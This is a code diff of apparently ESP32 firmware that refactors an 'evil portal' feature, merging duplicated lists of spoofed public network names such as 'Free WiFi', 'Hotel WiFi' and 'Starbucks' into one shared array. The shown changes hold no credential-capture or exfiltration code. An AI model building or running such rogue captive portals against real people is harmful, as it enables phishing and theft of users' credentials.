@@ -38,6 +38,12 @@ static unsigned long lastScanTime = 0;
 static unsigned long menuEnterTime = 0;
 static const unsigned long SCAN_INTERVAL = 60000;
 
+const char* customSSIDs[] = {
+    "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
+    "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
+};
+const int customSSIDCount = sizeof(customSSIDs) / sizeof(customSSIDs[0]);
+
 WebServer portalServer(80);
 DNSServer portalDNS;
 const byte DNS_PORT = 53;
@@ -237,23 +243,8 @@ void scanForNetworks() {
         }
     }
     
-    const char* defaultSSIDs[] = {
-        "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
-        "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
-    };
-    
-    for (int i = 0; i < 8 && scannedSSIDs.size() < 100; i++) {
-        String defaultSSID = String(defaultSSIDs[i]);
-        bool exists = false;
-        for (const String& existingSSID : scannedSSIDs) {
-            if (existingSSID == defaultSSID) {
-                exists = true;
-                break;
-            }
-        }
-        if (!exists) {
-            scannedSSIDs.push_back(defaultSSID);
-        }
+    for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
+        scannedSSIDs.push_back(String(customSSIDs[i]));
     }
     
     u8g2.clearBuffer();
@@ -450,17 +441,13 @@ void evilPortalLoop() {
                         currentTemplate = (currentTemplate + 1) % numTemplates;
                         break;
                     case 2:
-                        if (scanCompleted && !scannedSSIDs.empty()) {
+                        if (!scannedSSIDs.empty()) {
                             currentSSIDIndex = (currentSSIDIndex + 1) % scannedSSIDs.size();
                             currentSSID = scannedSSIDs[currentSSIDIndex];
                         } else {
-                            const char* commonSSIDs[] = {
-                                "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
-                                "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
-                            };
                             static int ssidIndex = 0;
-                            ssidIndex = (ssidIndex + 1) % 8;
-                            currentSSID = String(commonSSIDs[ssidIndex]);
+                            ssidIndex = (ssidIndex + 1) % customSSIDCount;
+                            currentSSID = String(customSSIDs[ssidIndex]);
                         }
                         break;
                     case 3:
